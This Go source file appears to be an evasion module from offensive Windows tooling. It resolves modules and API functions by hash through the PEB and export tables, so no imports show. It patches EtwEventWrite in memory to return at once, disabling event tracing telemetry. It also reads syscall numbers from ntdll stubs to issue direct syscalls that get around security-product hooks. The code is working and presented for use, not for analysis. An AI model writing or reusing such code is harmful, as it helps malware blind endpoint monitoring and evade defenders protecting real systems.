//go:build windows && amd64

package resolver

import (
	"syscall"
	"unsafe"
)

//go:noescape
func syscall3(sysid uint32, a1, a2, a3 uintptr) (r1 uintptr, err uint32)

// Hash FNV-1a para ANSI / WCHAR (normalizando a minúsculas).
func HashC(s string) uint32 {
	var h uint32 = 0x811C9DC5
	for i := 0; i < len(s); i++ {
		h ^= uint32(byte(s[i]))
		h *= 0x01000193
	}
	return h
}

func HashW(s string) uint32 {
	var h uint32 = 0x811C9DC5
	for i := 0; i < len(s); i++ {
		ch := s[i]
		if ch >= 'A' && ch <= 'Z' {
			ch = ch - 'A' + 'a'
		}
		h ^= uint32(ch)
		h *= 0x01000193
	}
	return h
}

// Estructuras mínimas para recorrer el PEB.
type listEntry struct {
	Flink *listEntry
	Blink *listEntry
}

type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type pebLdrData struct {
	Length                          uint32
	Initialized                     byte
	_                               [3]byte
	SsHandle                        uintptr
	InLoadOrderModuleList           listEntry
	InMemoryOrderModuleList         listEntry
	InInitializationOrderModuleList listEntry
}

type ldrDataTableEntry struct {
	InLoadOrderLinks           listEntry
	InMemoryOrderLinks         listEntry
	InInitializationOrderLinks listEntry
	DllBase                    uintptr
	EntryPoint                 uintptr
	SizeOfImage                uint32
	_                          uint32
	FullDllName                unicodeString
	BaseDllName                unicodeString
	// campos restantes omitidos
}

type peb struct {
	InheritedAddressSpace      byte
	ReadImageFileExecOptions   byte
	BeingDebugged              byte
	BitField                   byte
	_                          [4]byte
	Mutant                     uintptr
	ImageBaseAddress           uintptr
	Ldr                        *pebLdrData
	// campos restantes omitidos
}

//go:noescape
func getPEB() uintptr

func pebPtr() *peb {
	return (*peb)(unsafe.Pointer(getPEB()))
}

type moduleCacheEntry struct {
	hash uint32
	base uintptr
}

var moduleCache [8]moduleCacheEntry
var moduleCacheLen int

func cacheLookup(h uint32) uintptr {
	for i := 0; i < moduleCacheLen; i++ {
		if moduleCache[i].hash == h {
			return moduleCache[i].base
		}
	}
	return 0
}

func cachePush(h uint32, base uintptr) {
	if moduleCacheLen >= len(moduleCache) {
		return
	}
	moduleCache[moduleCacheLen] = moduleCacheEntry{hash: h, base: base}
	moduleCacheLen++
}

func unicodeToLowerASCII(u *unicodeString) []byte {
	n := int(u.Length / 2)
	out := make([]byte, 0, n)
	ptr := unsafe.Pointer(u.Buffer)
	for i := 0; i < n; i++ {
		ch := *(*uint16)(unsafe.Add(ptr, i*2))
		if ch >= 'A' && ch <= 'Z' {
			ch = ch - 'A' + 'a'
		}
		if ch > 0xFF {
			out = append(out, 0)
		} else {
			out = append(out, byte(ch))
		}
	}
	return out
}

// FindModule devuelve la base de un módulo cargado por hash. Si no está y se pasa dllName, lo carga dinámicamente.
func FindModule(hash uint32, dllName string) uintptr {
	if cached := cacheLookup(hash); cached != 0 {
		return cached
	}

	p := pebPtr()
	ldr := p.Ldr
	head := &ldr.InMemoryOrderModuleList

	for link := head.Flink; link != head; link = link.Flink {
		entry := (*ldrDataTableEntry)(unsafe.Pointer(uintptr(unsafe.Pointer(link)) - unsafe.Offsetof((*ldrDataTableEntry)(nil).InMemoryOrderLinks)))
		name := unicodeToLowerASCII(&entry.FullDllName)

		// Strip directory prefixes to hash only the DLL name.
		lastSlash := -1
		for i := 0; i < len(name); i++ {
			if name[i] == '\\' {
				lastSlash = i
			}
		}
		if lastSlash >= 0 && lastSlash+1 < len(name) {
			name = name[lastSlash+1:]
		}

		if HashC(string(name)) == hash {
			base := entry.DllBase
			cachePush(hash, base)
			return base
		}
	}

	// Intento de carga dinámica si no estaba presente.
	if dllName != "" {
		kernel := FindModule(HashW("kernel32.dll"), "")
		if kernel == 0 {
			return 0
		}
		loadLibrary := FindAPI(kernel, HashC("LoadLibraryA"))
		if loadLibrary == 0 {
			return 0
		}
		ptr, _, _ := syscall.SyscallN(loadLibrary, uintptr(unsafe.Pointer(syscall.StringBytePtr(dllName))))
		if ptr != 0 {
			cachePush(hash, ptr)
		}
		return ptr
	}

	return 0
}

type imageDosHeader struct {
	EMagic  uint16
	ECblp   uint16
	ECp     uint16
	ECrlc   uint16
	ECparhdr uint16
	EMinalloc uint16
	EMaxalloc uint16
	ESS      uint16
	ESp      uint16
	ECsum    uint16
	EIp      uint16
	ECs      uint16
	ELfarlc  uint16
	EOvno    uint16
	ERes     [4]uint16
	OEMid    uint16
	OEMinfo  uint16
	ERes2    [10]uint16
	ELfanew  int32
}

type imageFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type imageDataDirectory struct {
	VirtualAddress uint32
	Size           uint32
}

type imageOptionalHeader struct {
	Magic        uint16
	MajorLinkerVersion byte
	MinorLinkerVersion byte
	SizeOfCode   uint32
	SizeOfInitializedData uint32
	SizeOfUninitializedData uint32
	AddressOfEntryPoint uint32
	BaseOfCode uint32
	ImageBase uintptr
	SectionAlignment uint32
	FileAlignment uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion uint16
	MinorImageVersion uint16
	MajorSubsystemVersion uint16
	MinorSubsystemVersion uint16
	Win32VersionValue uint32
	SizeOfImage uint32
	SizeOfHeaders uint32
	CheckSum uint32
	Subsystem uint16
	DllCharacteristics uint16
	SizeOfStackReserve uintptr
	SizeOfStackCommit uintptr
	SizeOfHeapReserve uintptr
	SizeOfHeapCommit uintptr
	LoaderFlags uint32
	NumberOfRvaAndSizes uint32
	DataDirectory [16]imageDataDirectory
}

type imageNtHeaders struct {
	Signature      uint32
	FileHeader     imageFileHeader
	OptionalHeader imageOptionalHeader
}

type imageExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

func rva(module uintptr, offset uint32) uintptr {
	return module + uintptr(offset)
}

func exportDirectory(module uintptr) (*imageExportDirectory, uint32) {
	dos := (*imageDosHeader)(unsafe.Pointer(module))
	nt := (*imageNtHeaders)(unsafe.Pointer(module + uintptr(dos.ELfanew)))
	dir := nt.OptionalHeader.DataDirectory[0] // IMAGE_DIRECTORY_ENTRY_EXPORT
	if dir.VirtualAddress == 0 {
		return nil, 0
	}
	return (*imageExportDirectory)(unsafe.Pointer(rva(module, dir.VirtualAddress))), dir.Size
}

func sliceCString(ptr uintptr) []byte {
	if ptr == 0 {
		return nil
	}
	// bounded scan (up to 512 bytes) to avoid overruns
	const limit = 512
	var buf [limit]byte
	for i := 0; i < limit; i++ {
		b := *(*byte)(unsafe.Pointer(ptr + uintptr(i)))
		buf[i] = b
		if b == 0 {
			return buf[:i]
		}
	}
	return buf[:limit]
}

func resolveForwarder(fwd string) uintptr {
	dot := -1
	for i := 0; i < len(fwd); i++ {
		if fwd[i] == '.' {
			dot = i
			break
		}
	}
	if dot == -1 {
		return 0
	}

	module := fwd[:dot]
	fn := fwd[dot+1:]

	if len(module) < 4 || module[len(module)-4:] != ".dll" {
		module += ".dll"
	}

	base := FindModule(HashW(module), module)
	if base == 0 {
		return 0
	}
	return FindAPI(base, HashC(fn))
}

// FindAPI devuelve la dirección de una exportación por hash, resolviendo forwarders.
func FindAPI(module uintptr, hash uint32) uintptr {
	exp, expSize := exportDirectory(module)
	if exp == nil {
		return 0
	}

	names := (*[1 << 16]uint32)(unsafe.Pointer(rva(module, exp.AddressOfNames)))[:exp.NumberOfNames:exp.NumberOfNames]
	ordinals := (*[1 << 16]uint16)(unsafe.Pointer(rva(module, exp.AddressOfNameOrdinals)))[:exp.NumberOfNames:exp.NumberOfNames]
	funcs := (*[1 << 16]uint32)(unsafe.Pointer(rva(module, exp.AddressOfFunctions)))[:exp.NumberOfFunctions:exp.NumberOfFunctions]

	exportStart := uintptr(unsafe.Pointer(exp))
	exportEnd := exportStart + uintptr(expSize)

	for i := uint32(0); i < exp.NumberOfNames; i++ {
		nameBytes := sliceCString(rva(module, names[i]))
		if HashC(string(nameBytes)) != hash {
			continue
		}

		fnRVA := funcs[ordinals[i]]
		addr := rva(module, fnRVA)

		if addr >= exportStart && addr < exportEnd {
			fwd := string(sliceCString(addr))
			return resolveForwarder(fwd)
		}
		return addr
	}
	return 0
}

// GetProc es un helper tipado sobre FindAPI.
func GetProc[T ~uintptr](module uintptr, hash uint32) T {
	return T(FindAPI(module, hash))
}

// PatchEtwNop patches EtwEventWrite to "ret" to reduce telemetry surface.
func PatchEtwNop() {
	ntdll := FindModule(HashW("ntdll.dll"), "ntdll.dll")
	if ntdll == 0 {
		return
	}
	fn := FindAPI(ntdll, HashC("EtwEventWrite"))
	if fn == 0 {
		return
	}

	// PAGE_EXECUTE_READWRITE = 0x40
	protect := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
	var old uint32
	_, _, _ = protect.Call(fn, 1, 0x40, uintptr(unsafe.Pointer(&old)))
	*(*byte)(unsafe.Pointer(fn)) = 0xC3 // ret
	_, _, _ = protect.Call(fn, 1, uintptr(old), uintptr(unsafe.Pointer(&old)))
}

// FindSyscallID analiza el stub de ntdll en memoria y extrae el número de syscall.
// Patrón típico: 4c 8b d1 b8 xx xx xx xx 0f 05 c3
func FindSyscallID(fn uintptr) (uint32, bool) {
	const stubLen = 12
	var buf [stubLen]byte
	for i := 0; i < stubLen; i++ {
		buf[i] = *(*byte)(unsafe.Pointer(fn + uintptr(i)))
	}

	if buf[0] != 0x4c || buf[1] != 0x8b || buf[2] != 0xd1 {
		return 0, false
	}
	if buf[3] != 0xb8 {
		return 0, false
	}

	sysid := uint32(buf[4]) | uint32(buf[5])<<8 | uint32(buf[6])<<16 | uint32(buf[7])<<24
	if buf[8] != 0x0f || buf[9] != 0x05 {
		return 0, false
	}
	return sysid, true
}

// NtDelayExecution vía syscall directo (sleep resistente a hooks).
func NtDelayExecution(sysid uint32, alertable uint8, interval *int64) uintptr {
	val, _ := syscall3(sysid, uintptr(alertable), uintptr(unsafe.Pointer(interval)), 0)
	return val
}
